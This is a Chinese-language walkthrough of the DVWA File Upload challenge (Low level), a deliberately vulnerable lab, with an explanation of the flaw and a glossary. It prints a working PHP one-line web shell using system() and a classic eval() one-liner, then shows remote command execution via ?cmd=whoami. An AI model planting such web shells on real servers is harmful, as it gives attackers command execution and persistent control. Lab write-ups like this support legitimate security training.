DVWA-Low-文件上传 (File Upload)

2026年10月2日 DVWA Web安全 文件上传 RCE

一、题目信息

  • 题目名称：DVWA File Upload (Low)
  • 题目平台：DVWA (本地 Docker / 灵境靶场)
  • 题目类型：Web安全 / 文件上传 / WebShell / RCE
  • 靶场链接：http://192.168.242.80/vulnerabilities/upload/
  • 涉及工具：Google Chrome 浏览器、VS Code、Burp Suite (Medium 级别备用)

二、解题步骤

1. 分析题目考什么

本题的核心考点是文件上传漏洞。Web 应用允许用户上传文件（如图片），如果后端没有对文件的后缀、MIME 类型或内容进行严格校验，攻击者就可以上传一个 PHP 木马文件（WebShell），并通过访问该文件在服务器上执行任意系统命令。

2. 怎么想（破题思路）

  • 创建一个包含恶意代码的 PHP 文件（`shell.php`）。
  • 直接上传该文件，观察页面是否允许并提示保存路径。
  • 根据提示的路径（如 `../../hackable/uploads/shell.php`），在浏览器中访问该文件并传入参数（如 `?cmd=whoami`）。
  • 如果页面成功回显系统命令的执行结果，说明 WebShell 连接成功，漏洞利用完成。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：上传了 .txt 或 .PHP 大写后缀导致无法执行

踩坑情况：初次尝试时，尝试上传 `shell.txt` 或 `shell.PHP`，页面提示上传成功，但访问时却无法执行命令。

原因分析：Web 服务器（Apache/Nginx）默认只将 `.php` 后缀的文件交给 PHP 引擎解析执行。Linux 系统严格区分大小写，`.PHP` 可能被当作普通文本文件（或直接下载），导致代码无法被解析。

改进方式：将文件重命名为全小写的 shell.php，确保服务器将其识别为 PHP 脚本并执行。

详细实操步骤（Payload逐字解释）

第一步：创建 WebShell 木马文件

在本地使用 VS Code 新建一个文件，命名为 shell.php，并写入以下代码：

<?php @system($_GET['cmd']); ?>

逐个字符解释：

  • <?php：PHP 代码的开始标记。
  • @：错误抑制符，防止 PHP 报错信息干扰页面输出。
  • system()：PHP 内置的系统命令执行函数，用于在操作系统层面执行命令。
  • $_GET['cmd']：接收 URL 中通过 GET 方式传递的 cmd 参数。
  • ?>：PHP 代码结束标记。

第二步：上传木马文件

在 DVWA 页面点击“选择文件”，选中 shell.php，点击 Upload。

响应结果：页面提示 ../../hackable/uploads/shell.php succesfully uploaded!。说明文件已成功保存在 Web 目录下。

第三步：触发 WebShell（远程代码执行）

打开浏览器新标签页，访问以下 URL：

http://192.168.242.80/hackable/uploads/shell.php?cmd=whoami

响应结果：页面直接输出 www-data。说明木马成功执行，拿到了服务器的命令执行权限。

4. 怎么迁移（跨领域联想）

  • 真实业务中的头像上传：很多社交平台允许用户上传头像。如果未做校验，攻击者可以上传一个 PHP 木马，通过访问头像链接控制整个服务器。这是护网中 Web 打点最常见的入口之一。
  • 物联网固件升级：智能设备固件升级接口如果存在文件上传漏洞，攻击者可以上传恶意固件，导致设备被长期控制，甚至形成僵尸网络。

三、名词大全与原理深度复盘

1. WebShell

一种以网页文件形式存在的后门程序。攻击者上传后，可以通过 HTTP 协议与服务器交互，执行系统命令、上传下载文件、连接数据库等。常见的 WebShell 有 PHP 一句话木马、JSP 木马等。

2. MIME 类型 (Multipurpose Internet Mail Extensions)

HTTP 协议中用于标识文件类型的标头（如 `Content-Type: image/jpeg`）。许多后端仅通过检查 MIME 类型来判断上传文件是否为图片，攻击者可以抓包篡改 MIME 类型来绕过检测（中等安全级别常见漏洞）。

3. 一句话木马

代码极短、功能单一但隐蔽性强的 WebShell。最经典的 PHP 一句话木马就是 <?php @eval($_POST['password']); ?>，配合中国菜刀、蚁剑、冰蝎等工具使用。

4. www-data

Linux 系统中 Apache/Nginx 服务的默认运行用户。通过 WebShell 执行的命令默认拥有该用户权限，权限较低，通常需要进一步提权（如利用 SUID、内核漏洞等）才能拿到 root。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与命令注入的区别：命令注入是直接利用现有漏洞执行系统命令。文件上传则是把恶意代码（WebShell）上传到服务器，随后通过浏览器访问触发执行，属于“持久化控制”的第一步。
  • 与文件包含的区别：文件包含是读取或执行服务器上已有的文件。文件上传可以配合文件包含使用（如上传图片马，再用文件包含去解析），形成组合拳。

2. 这种题目的出现原因（为什么存在）

漏洞存在的根本原因在于后端开发人员为了方便，直接将用户上传的文件保存在了 Web 可访问的目录下，且没有对文件后缀或内容进行严格校验。例如：move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);。

从历史角度看，这在早期的 CMS（内容管理系统）和论坛程序中极为普遍，比如早期的 Discuz!、WordPress 插件漏洞，常常导致大量网站被批量上传 WebShell，成为肉鸡。

3. 这种的应用

在护网攻防演练中，文件上传是“外网打点”的核心得分手段。一旦攻击者通过文件上传拿到 WebShell，就可以进一步读取服务器配置、连接内网数据库、搭建隧道进入企业内网。这也是为什么护网中蓝队最关注上传接口的原因。

4. 如何抽象理解概念（大白话）

把文件上传比作“小区快递站”：

  • 正常情况：业主（用户）把网购的普通商品（图片）存放在快递站（服务器上传目录）。
  • 恶意情况：坏人（攻击者）把一个伪装成包裹的“炸弹”（WebShell）放在快递站。
  • 如果快递站管理员不检查包裹内容（未校验文件后缀），业主去取件（访问文件）时，炸弹就会引爆（执行系统命令）。
